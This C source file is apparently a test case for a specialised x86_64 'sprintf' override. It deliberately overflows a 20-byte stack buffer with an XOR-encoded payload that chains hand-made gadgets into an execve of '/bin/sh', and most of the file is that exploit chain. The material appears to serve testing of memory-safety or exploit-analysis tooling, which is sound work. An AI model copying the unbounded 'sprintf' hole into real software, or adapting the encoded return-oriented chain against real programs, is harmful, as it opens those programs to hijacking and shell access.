#include <stdio.h>

/*
 * A test for the x86_64 specialized `sprintf` override with a stack buffer
 * overflow to a gadget.
 *
 * The weird machine hops between the artification gadgets in the order
 * 4 -> 1 -> 2 -> 3 resulting in an execve call to start a shell.
 * `artificial_gadget_4` "decrypts" the payload by XORing it with the
 * "decryption" key.
 *
 * This test requires the specialized `sprintf` override because
 * artificial_gadget_4 depends on the caller saved register %rdi holding a
 * pointer to the end of `sprintf`'s output buffer.
 */

unsigned long long artificial_gadget_1(char *ptr) {
    int i = 0;
    ptr[i++] = '/';
    ptr[i++] = 'b';
    ptr[i++] = 'i';
    ptr[i++] = 'n';
    ptr[i++] = '/';
    ptr[i++] = 's';
    ptr[i++] = 'h';
    ptr[i++] = 0;
    return 0x3b; //execve system call number into %rax
}

void artificial_gadget_2() {
    asm("xor %rsi, %rsi; xor %rdx, %rdx; ret");
    //zero out %rsi and %rdx in prep for syscall
}

void artificial_gadget_3() {
    asm("syscall;");
}

void artificial_gadget_4() {
    asm("sub $0x30, %rsp");
    //load xor key
    asm("sub $0xb, %rdi;");
    asm("mov (%rdi), %rdx;");
    //decode payload with xor key - 5 times
    asm("xor %rdx, (%rdi); sub $0x8, %rdi");
    asm("xor %rdx, (%rdi); sub $0x8, %rdi");
    asm("xor %rdx, (%rdi); sub $0x8, %rdi");
    asm("xor %rdx, (%rdi); sub $0x8, %rdi");
    asm("xor %rdx, (%rdi);");
    asm("ret");
}

const char payload[] = {
    0xe8, 0xcc, 0x9d, 0xdd, 0xdd, 0xdd, 0xdd, 0xdd, /* 0x401135 -- artificial_gadget_1 */
    0x22, 0xcc, 0x9d, 0xdd, 0xdd, 0xdd, 0xdd, 0xdd, /* 0x4011ff -- artificial_gadget_2 */
    0xd0, 0xcf, 0x9d, 0xdd, 0xdd, 0xdd, 0xdd, 0xdd, /* 0x40120d -- artificial_gadget_3 */
    0xf2, 0xbf, 0xb4, 0xb3, 0xf2, 0xae, 0xb5, 0xdd, /* "/bin/sh\x00" */
    0xdd, 0xdd, 0xdd, 0xdd, 0xdd, 0xdd, 0xdd, 0xdd, /* xor key */
    0x16, 0x12, 0x40, /* artificial_gadget_4 */
    0
};

void exploitable(void) {
  char out[20];
  sprintf(out, "%s", payload);
}

int main(void) {
  exploitable();
  return 0;
}
